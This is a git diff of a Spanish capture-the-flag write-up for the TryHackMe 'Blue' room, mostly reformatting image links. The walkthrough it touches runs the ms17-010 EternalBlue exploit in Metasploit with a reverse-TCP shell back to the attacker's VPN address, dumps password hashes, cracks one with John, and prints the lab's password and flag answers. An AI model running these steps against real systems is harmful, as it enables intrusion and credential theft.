@@ -18,19 +18,19 @@ Hay 3 puertos abiertos que tengan un valor menor a 1000, los cuales son el 135, 
 
 **Respuesta: 3
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225020639.png]]
+![](IMG/Pasted%20image%2020250225020639.png)
 ## c) ¿A qué es vulnerable esta máquina? (Respuesta en forma de: ms??-???, ej: ms08-067)
 
 Vemos que tiene una vulnerabilidad con el CVE-2017-0143, y el codigo de la vulnerabilidad es el ms17-010.
 
 **Respuesta: ms17-010
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225021134.png]]
+![](IMG/Pasted%20image%2020250225021134.png)
 
 > [!NOTE] NOTA
 > Tambien podemos ver el codigo de vulnerabilidad en esta web: https://www.exploit-db.com/ buscando por el CVE.
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225021559.png]]
+![](IMG/Pasted%20image%2020250225021559.png)
 
 # 2) Obtener Acceso
 
@@ -42,7 +42,7 @@ Iniciamos metasploit usando:
 msfconsole
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225022257.png]]
+![](IMG/Pasted%20image%2020250225022257.png)
 
 **Respuesta: No aplica.
 
@@ -54,14 +54,15 @@ Una vez iniciado metasploit, buscaremos el exploit usando:
 search ms17-010
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225022450.png]]
+![](IMG/Pasted%20image%2020250225022450.png)
+
 En nuestro caso, probaremos con el primero, el cual tiene el número 0, por lo que para usarlo ejecutamos:
 
 ```
 use 0
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225022723.png]]
+![](IMG/Pasted%20image%2020250225022723.png)
 
 Una vez que lo tenemos en uso, debemos configurarlo, por lo que ejecutaremos:
 
@@ -69,7 +70,7 @@ Una vez que lo tenemos en uso, debemos configurarlo, por lo que ejecutaremos:
 options
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225023104.png]]
+![](IMG/Pasted%20image%2020250225023104.png)
 
 Solo tendremos que aportar la información que es necesaria y no tenemos, en nuestro caso debemos introducir la IP del objetivo (RHOSTS), para ello usaremos:
 
@@ -77,13 +78,12 @@ Solo tendremos que aportar la información que es necesaria y no tenemos, en nue
 set RHOSTS 10.10.54.88
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225023253.png]]
-
+![](IMG/Pasted%20image%2020250225023253.png)
 
 > [!NOTE] NOTA
 > Cuidado que aquí metiste el patazo gordo y no cambiaste la Ip de la maquina atacante, LHOSTS, se debe poner la ip que corresponda al interfaz tun0 ya que estamos en la VPN. Si no se cambia la ip no se consigue ejecutar correctamente el exploit. usamos set LHOST 10.8.16.0
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225030957.png]]
+![](IMG/Pasted%20image%2020250225030957.png)
 
 La ruta al exploit la tenemos entre parentesis en el prompt.
 
@@ -99,7 +99,7 @@ La ruta al exploit la tenemos entre parentesis en el prompt.
 set payload windows/x64/shell/reverse_tcp
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225023838.png]]
+![](IMG/Pasted%20image%2020250225023838.png)
 
 ¡Una vez hecho esto, ejecuta el exploit!
 
@@ -109,15 +109,15 @@ Para ejecutar el exploit usamos:
 run
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225024047.png]]
+![](IMG/Pasted%20image%2020250225024047.png)
 
 Aunque nos devuelva algunos errores, dejamos que termine por si funcionara, pues estos errores son normales.
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225024211.png]]
+![](IMG/Pasted%20image%2020250225024211.png)
 
 Finalmente conseguira ejecutar el exploit
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225032706.png]]
+![](IMG/Pasted%20image%2020250225032706.png)
 
 > [!NOTE] NOTA
 > Ha costado que ejecute el script, que no cunda el pánico, respira hondo y ejecutalo varias veces, reinicia la conexion VPN, sal y entra de metasploit, etc... cuando le de la gana funcionará.
@@ -128,11 +128,11 @@ Finalmente conseguira ejecutar el exploit
 
 Obtenemos una shell en la maquina objetivo:
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225032935.png]]
+![](IMG/Pasted%20image%2020250225032935.png)
 
 Y la comprobamos probando a ejecutar un whoami:
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226022453.png]]
+![](IMG/Pasted%20image%2020250226022453.png)
 
 **Respuesta: No aplica.
 
@@ -146,7 +146,7 @@ Ponemos la shell en segundo plano, ejecutamos:
 Control + Z
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225033036.png]]
+![](IMG/Pasted%20image%2020250225033036.png)
 
 Ahora, cambiamos la shell a meterpreter y configuraremos sus opciones usando:
 
@@ -155,7 +155,7 @@ use post/multi/manage/shell_to_meterpreter
 options
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225033257.png]]
+![](IMG/Pasted%20image%2020250225033257.png)
 
 **Respuesta: post/multi/manage/shell_to_meterpreter
 
@@ -174,7 +174,7 @@ Vemos que debemos aportar el id de la sesión, para ello veremos las sesiones qu
 sessions
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225033425.png]]
+![](IMG/Pasted%20image%2020250225033425.png)
 
 Como solo tenemos una, hay poco donde elegir, seleccionamos la sesión usando:
 
@@ -182,7 +182,7 @@ Como solo tenemos una, hay poco donde elegir, seleccionamos la sesión usando:
 set session 1
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225033542.png]]
+![](IMG/Pasted%20image%2020250225033542.png)
 
 también configuramos LHOST a tun0 (que ha dado problemas), usando:
 
@@ -190,7 +190,7 @@ también configuramos LHOST a tun0 (que ha dado problemas), usando:
 set LHOST tun0
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225033724.png]]
+![](IMG/Pasted%20image%2020250225033724.png)
 
 ## d) ¡run! Si esto no funciona, intenta completar el exploit de la tarea anterior una vez más.
 
@@ -200,11 +200,11 @@ una vez configurado, lanzamos el exploit:
 run
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225033830.png]]
+![](IMG/Pasted%20image%2020250225033830.png)
 
 OJO que puede fallar y no crear la sesión 2, debe salirnos esto:
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225034122.png]]
+![](IMG/Pasted%20image%2020250225034122.png)
 
 si no sale, repetir desde set session 1... hasta que salga.
 
@@ -217,7 +217,7 @@ set session 2
 sessions 2
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225034309.png]]
+![](IMG/Pasted%20image%2020250225034309.png)
 
 ## f) Verifique que hayamos escalado a NT AUTHORITY\SYSTEM. Ejecute getsystem para confirmarlo. No dude en abrir un shell de DOS mediante el comando 'shell' y ejecutar 'whoami'. Esto debería indicar que efectivamente somos system. Luego, vuelva a poner este shell en segundo plano y seleccione nuestra sesión meterpreter para usarla nuevamente.
 
@@ -229,7 +229,7 @@ shell
 whoami
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250225034523.png]]
+![](IMG/Pasted%20image%2020250225034523.png)
 
 Para cambiar de la shell a meterpreter, usamos:
 
@@ -249,7 +249,7 @@ ps
 
 y usaremos, por ejemplo, el ultimo de los procesos:
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226030303.png]]
+![](IMG/Pasted%20image%2020250226030303.png)
 
 En nuestro caso tiene el ID 3028
 
@@ -263,7 +263,7 @@ migrate 3028
 
 y nos ha dado error, así que usamos otro proceso, por ejemplo, el 3008:
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226030636.png]]
+![](IMG/Pasted%20image%2020250226030636.png)
 
 **Respuesta: No aplica.
 
@@ -279,7 +279,7 @@ hashdump
 
 y vemos todos los usuarios y sus contraseñas, el usuario no predeterminado es Jon.
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226030953.png]]
+![](IMG/Pasted%20image%2020250226030953.png)
 
 **Respuesta: Jon
 
@@ -293,7 +293,7 @@ nano jon.txt
 
 y hemos pegado el hash de la contraseña en su interior.
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226031431.png]]
+![](IMG/Pasted%20image%2020250226031431.png)
 
 Ahora, hemos usado John the ripper y el diccionario Rockyou para intentar descifrarla, de esta forma:
 
@@ -303,7 +303,7 @@ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon.txt
 
 Y hemos metido la pata de nuevo, porque el archivo rockyou.txt no existe en la ruta:
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226032100.png]]
+![](IMG/Pasted%20image%2020250226032100.png)
 
 y es porque lo tenemos comprimido, así que lo descomprimimos primero usando:
 
@@ -311,11 +311,11 @@ y es porque lo tenemos comprimido, así que lo descomprimimos primero usando:
 sudo gzip -d rockyou.txt.gz
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226032321.png]]
+![](IMG/Pasted%20image%2020250226032321.png)
 
 Y lo intentamos de nuevo (ahora con exito):
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226032406.png]]
+![](IMG/Pasted%20image%2020250226032406.png)
 
 **Respuesta: alqfna22
 
@@ -325,9 +325,6 @@ Y lo intentamos de nuevo (ahora con exito):
 
 Desde meterpreter (para poder usar comandos linux) entramos a la raiz del sistema, y veremos el archivo flag1.txt.
 
-> [!NOTE] NOTA
-> Atento, que desde meterpreter en las rutas hay que usar dobles barras "\"
-
 Sería así:
 
 ```
@@ -335,7 +332,7 @@ cd c:\\
 ls
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226132523.png]]
+![](IMG/Pasted%20image%2020250225034523.png)
 
 lo abrimos usando cat:
 
@@ -343,7 +340,7 @@ lo abrimos usando cat:
 cat flag1.txt
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226132912.png]]
+![](IMG/Pasted%20image%2020250226132912.png)
 
 **Respuesta: flag{access_the_machine}
 
@@ -356,11 +353,11 @@ cd c:\\Windows\\system32\\config
 ls
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226133224.png]]
+![](IMG/Pasted%20image%2020250226133224.png)
 
 Encontraremos la segunda bandera.
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226133415.png]]
+![](IMG/Pasted%20image%2020250226133415.png)
 
 la abrimos y tendremos la segunda flag.
 
@@ -368,7 +365,7 @@ la abrimos y tendremos la segunda flag.
 cat flag2.txt
 ```
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226133506.png]]
+![](IMG/Pasted%20image%2020250226133506.png)
 
 **Respuesta: flag{sam_database_elevated_access}
 
@@ -376,12 +373,12 @@ cat flag2.txt
 
 La flag estará en los documentos del usuario jon, así que buscamos la ubicación.
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226134110.png]]
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226134138.png]]
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226134203.png]]
+![](IMG/Pasted%20image%2020250226134110.png)
+![](IMG/Pasted%20image%2020250226134138.png)
+![](IMG/Pasted%20image%2020250226134203.png)
 
 la abrimos y encontramos la ultima flag.
 
-![[WriteUps/1. Blue (THM)/IMG/Pasted image 20250226134246.png]]
+![](IMG/Pasted%20image%2020250226134246.png)
 
 **Respuesta: flag{admin_documents_can_be_valuable}
